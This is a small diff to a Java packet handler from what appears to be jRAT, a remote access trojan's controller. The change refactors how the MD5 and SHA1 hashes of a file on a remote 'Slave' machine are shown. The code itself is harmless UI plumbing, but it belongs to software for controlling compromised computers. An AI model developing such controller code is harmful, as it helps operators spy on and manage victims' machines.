@@ -5,6 +5,7 @@ import java.io.DataInputStream;
 import javax.swing.JOptionPane;
 
 import se.jrat.client.Slave;
+import se.jrat.client.ui.frames.FrameRemoteFiles;
 import se.jrat.client.ui.frames.FrameRemoteFilesOld;
 
 
@@ -15,16 +16,16 @@ public class Packet46FileHash extends AbstractIncomingPacket {
 		final String md5 = slave.readLine();
 		final String sha1 = slave.readLine();
 
-		FrameRemoteFilesOld frame = FrameRemoteFilesOld.instances.get(slave);
+		FrameRemoteFiles frame = FrameRemoteFiles.INSTANCES.get(slave);
 		if (frame != null) {
-			if (frame.waitingForMd5) {
+			if (frame.remoteTable.waitingForMd5) {
 				new Thread() {
 					@Override
 					public void run() {
 						JOptionPane.showMessageDialog(null, "File MD5:\n\n" + md5 + "\n\n\nFile SHA1:\n\n" + sha1, "Hash", JOptionPane.INFORMATION_MESSAGE);
 					}
 				}.start();
-				frame.waitingForMd5 = false;
+				frame.remoteTable.waitingForMd5 = false;
 			}
 		}
 	}
